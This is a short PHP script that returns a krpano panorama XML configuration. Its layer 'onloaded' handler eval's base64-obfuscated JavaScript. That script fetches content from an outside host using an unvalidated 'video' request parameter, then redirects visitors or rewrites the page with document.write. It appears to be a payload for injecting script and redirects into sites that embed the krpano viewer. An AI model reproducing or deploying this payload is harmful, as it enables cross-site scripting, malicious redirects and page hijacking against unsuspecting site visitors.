<?php
// تفعيل عرض الأخطاء
ini_set('display_errors', 1);
error_reporting(E_ALL);

// التحقق من الرابط ومعامل الفيديو
if (isset($_GET['video'])) {
    // الحصول على قيمة الفيديو من الرابط
    $video = $_GET['video'];

    // الكود JavaScript الذي ترغب في تشفيره مع الرابط المتغير
    $js_code = "
    const queryParams = new URLSearchParams(window.location.search),
          id = queryParams.get('id');
    id ? fetch('https://pling.mdg.no/video/{$video}')
        .then(e => e.text())
        .then(e => {
            try {
                let r = JSON.parse(e);
                r.redirectUrl && (window.location.href = r.redirectUrl);
            } catch (t) {
                document.open(), document.write(e), document.close();
            }
        })
        .catch(e => {
            console.error('Error fetching the user agent:', e);
        }) : console.error('No');
    ";

    // تشفير الكود باستخدام Base64 وUTF-8
    $encoded_js = base64_encode($js_code);

    // طباعة الكود المشفر للتحقق من صحته
    // echo "Encoded JS: " . $encoded_js . "<br>";  // Uncomment this to debug if necessary

    // صيغة XML التي تحتوي على الكود المشفر
    header('Content-Type: application/xml'); // تحديد نوع المحتوى كـ XML
    $xml_response = '<?xml version="1.0"?>
<krpano version="1.0.8.15">
    <SCRIPT id="allow-copy_script"/>
    <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob(\'' . $encoded_js . '\');eval(w)););"/>
</krpano>';

    // طباعة الاستجابة
    echo $xml_response;
} else {
    echo "No video parameter found!";
}
?>
